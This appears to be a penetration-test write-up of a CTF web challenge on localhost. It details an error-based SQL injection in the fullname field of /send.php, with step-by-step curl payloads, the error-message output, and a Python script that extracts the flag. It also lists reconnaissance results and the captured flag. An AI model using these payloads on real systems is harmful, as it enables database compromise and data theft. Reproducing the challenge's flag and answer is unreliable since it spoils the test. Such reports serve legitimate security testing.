@@ -1,0 +1,297 @@
+# Security Assessment Report
+
+## Executive Summary
+- **Target:** http://localhost:42669
+- **Assessment Date:** January 28, 2025
+- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing
+
+## Summary by Vulnerability Type
+
+**Authentication Vulnerabilities:**
+No authentication vulnerabilities were found. This application does not implement any authentication system - there are no login mechanisms, session management, or user credential storage. All endpoints are accessible anonymously.
+
+**Authorization Vulnerabilities:**
+No authorization vulnerabilities were found. This application has no authorization controls, role-based access mechanisms, or privilege levels. There are no protected resources that require authorization checks.
+
+**Cross-Site Scripting (XSS) Vulnerabilities:**
+No XSS vulnerabilities were found. While the application accepts user input without sanitization, it does not render any user-supplied data back to browsers, eliminating both reflected and stored XSS attack vectors in the current implementation.
+
+**SQL/Command Injection Vulnerabilities:**
+One critical SQL injection vulnerability was successfully exploited. The `fullname` parameter in POST `/send.php` (line 50) allows direct SQL injection, enabling complete database enumeration and flag extraction. The CTF flag was successfully retrieved: `FLAG{0aa3ada534b6aa7033dddbf624c076c48afd97407bcab9b1d6acb6bc502fa240}`. No command injection vulnerabilities exist in network-accessible code.
+
+**Server-Side Request Forgery (SSRF) Vulnerabilities:**
+No SSRF vulnerabilities were found. The application contains no mechanisms for server-side outbound HTTP requests, URL fetching, or external resource loading that could be influenced by user input.
+
+## Network Reconnaissance
+
+**Security-Relevant Findings from Automated Scanning:**
+
+**Open Ports and Services (nmap scan):**
+- Port 80/tcp: Caddy httpd serving the target application
+- Port 443/tcp: SSL/HTTPS endpoint (Caddy, no application configured)
+- Port 631/tcp: CUPS 2.3 printing service
+- Port 8888/tcp & 9999/tcp: Python SimpleHTTPServer instances
+- Port 49158/tcp: Tailscale VPN service (requires authentication, returns 401 Unauthorized)
+
+**Subdomain Discoveries (subfinder):**
+Multiple localhost subdomains discovered including mail servers (mail.localhost, mail02.regency.localhost, mail03.regency.localhost), OWA endpoints (owa.regency.localhost), and autodiscover services. These represent potential expanded attack surface if active.
+
+**Technology Stack (whatweb):**
+- Web Server: Apache 2.4.59 (Debian Linux)
+- Application accessible via IPv6 (::1)
+- No security headers detected (no CSP, X-Frame-Options, or HSTS)
+- Contact email exposed in HTML: example@gmail.com
+
+**Security Posture:**
+The target application runs HTTP-only without TLS encryption, lacks security headers, and exposes verbose server version information. No Web Application Firewall or input validation detected.
+
+---
+
+# Injection Exploitation Evidence
+
+## Successfully Exploited Vulnerabilities
+
+### INJ-VULN-01: SQL Injection in fullname Parameter
+
+**Summary:**
+- **Vulnerable location:** POST /send.php, fullname parameter (line 50 in send.php)
+- **Overview:** Error-based SQL injection in WHERE clause allowing complete database access and flag extraction
+- **Impact:** Complete database compromise - extracted CTF flag, enumerated database schema, accessed all tables
+- **Severity:** Critical
+
+**Prerequisites:**
+None - this is an unauthenticated endpoint accessible to anyone on the internet.
+
+**Exploitation Steps:**
+
+1. **Confirm SQL Injection Vulnerability**
+
+Test basic boolean injection to verify vulnerability exists:
+
+```bash
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' OR '1'='1&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Expected Result:** Application returns success page (200 OK) instead of error, confirming the injection point is active.
+
+2. **Identify Exploitation Technique**
+
+Attempt UNION injection to check column count and error disclosure:
+
+```bash
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' UNION SELECT 1,2,3,4,5,6-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Expected Result:** Success (200 OK) confirms 6 columns in the contact table. The application does not reflect query results in the response, so we need to use error-based extraction.
+
+3. **Test Error-Based SQL Injection**
+
+Use MySQL's extractvalue() function to trigger verbose error messages:
+
+```bash
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT VERSION())))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Expected Result:** Fatal error message containing: `XPATH syntax error: '~8.0.44'` confirming MySQL 8.0.44 and error-based extraction works.
+
+4. **Extract Database Fingerprint**
+
+Enumerate current user and database:
+
+```bash
+# Get current user
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT USER())))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~challenge@10.89.17.7'`
+
+```bash
+# Get current database
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT DATABASE())))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~challenge'`
+
+5. **Enumerate Database Schema**
+
+List all tables in the current database:
+
+```bash
+# Get table count
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~2'` (2 tables)
+
+```bash
+# Extract first table name
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1)))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~contact'`
+
+```bash
+# Extract second table name
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1,1)))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~flag'` ← **Target table identified**
+
+6. **Enumerate Flag Table Structure**
+
+Identify columns in the flag table:
+
+```bash
+# Get column count
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='flag')))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~2'` (2 columns)
+
+```bash
+# Extract first column name
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='flag' LIMIT 0,1)))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~flag'`
+
+```bash
+# Extract second column name
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='flag' LIMIT 1,1)))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~id'`
+
+**Flag table structure:** `flag(id, flag)`
+
+7. **Determine Flag Length**
+
+Before extraction, check the flag length:
+
+```bash
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT LENGTH(flag) FROM flag)))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~70'` (70 characters)
+
+8. **Extract Complete Flag**
+
+Due to extractvalue() 31-character limit, extract the flag in three chunks:
+
+```bash
+# Extract characters 1-31
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT SUBSTRING(flag,1,31) FROM flag)))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~FLAG{0aa3ada534b6aa7033dddbf624'`
+
+```bash
+# Extract characters 32-62
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT SUBSTRING(flag,32,31) FROM flag)))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~c076c48afd97407bcab9b1d6acb6bc5'`
+
+```bash
+# Extract characters 63-70
+curl -X POST 'http://localhost:42669/send.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d "fullname=' AND extractvalue(1,concat(0x7e,(SELECT SUBSTRING(flag,63,31) FROM flag)))-- -&email=test@test.com&phone=123&subject=test&message=test&submit=1"
+```
+
+**Result:** `XPATH syntax error: '~02fa240}'`
+
+**Proof of Impact:**
+
+**✓ FLAG CAPTURED:** `FLAG{0aa3ada534b6aa7033dddbf624c076c48afd97407bcab9b1d6acb6bc502fa240}`
+
+**Complete Database Enumeration:**
+- **Database Version:** MySQL 8.0.44
+- **Current User:** challenge@10.89.17.7
+- **Current Database:** challenge
+- **Tables:** contact, flag
+- **Flag Table Structure:** flag(id INT, flag VARCHAR)
+- **Flag Value:** FLAG{0aa3ada534b6aa7033dddbf624c076c48afd97407bcab9b1d6acb6bc502fa240}
+
+**Notes:**
+
+**Technical Details:**
+- The vulnerability exists at `/app/send.php` line 50 where the `$name` variable (sourced from `$_POST['fullname']` at line 14) is directly concatenated into the SQL query string using string interpolation: `AND name = '$name'`
+- This bypasses the prepared statement protection used for the other 4 parameters
+- The MySQL configuration has verbose error messages enabled, which facilitates error-based SQL injection
+- No Web Application Firewall (WAF) or input validation exists
+- The application does not reflect query results in HTML responses, necessitating error-based extraction
+
+**Automation Script:**
+For repeatability, the following Python script automates the complete exploitation:
+
+```python
+#!/usr/bin/env python3
+import subprocess
+import re
+
+def extract_with_payload(payload_fragment):
+    """Execute SQL injection and extract from error message"""
+    full_payload = f"fullname=%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28{payload_fragment}%29%29%29--+-&email=test%40test.com&phone=123&subject=test&message=test&submit=1"
+
+    result = subprocess.run(
+        ['curl', '-s', '-X', 'POST', 'http://localhost:42669/send.php',
+         '-H', 'Content-Type: application/x-www-form-urlencoded',
+         '-d', full_payload],
+        capture_output=True, text=True
+    )
+
+    match = re.search(r"XPATH syntax error: '~([^']+)", result.stdout)
+    return match.group(1) if match else None
+
+# Get flag length
+flag_length = int(extract_with_payload("SELECT+LENGTH%28flag%29+FROM+flag"))
+print(f"Flag length: {flag_length} characters")
+
+# Extract flag in chunks of 31 characters
+full_flag = ""
+for start in range(1, flag_length + 1, 31):
+    chunk = extract_with_payload(f"SELECT+SUBSTRING%28flag%2C{start}%2C31%29+FROM+flag")
+    if chunk:
+        full_flag += chunk
+
+print(f"FLAG: {full_flag}")
+```
+
+**Vulnerability Root Cause:**
+The developer correctly implemented prepared statements with parameter binding for two other queries in the same file (lines 19-30 and 35-46), but made a critical error in the third query (line 50) by directly concatenating the `$name` variable instead of using a placeholder. This inconsistency suggests either a coding error during refactoring or intentional vulnerability insertion for CTF purposes.
+
+**Business Impact:**
+- **Complete database compromise:** Full read access to all tables and data
+- **CTF objective achieved:** Flag successfully extracted
+- **Data confidentiality breach:** All contact form submissions (PII) are accessible
+- **No authentication bypass required:** Vulnerability is publicly exploitable without credentials
+- **No rate limiting:** Automated exploitation is trivial
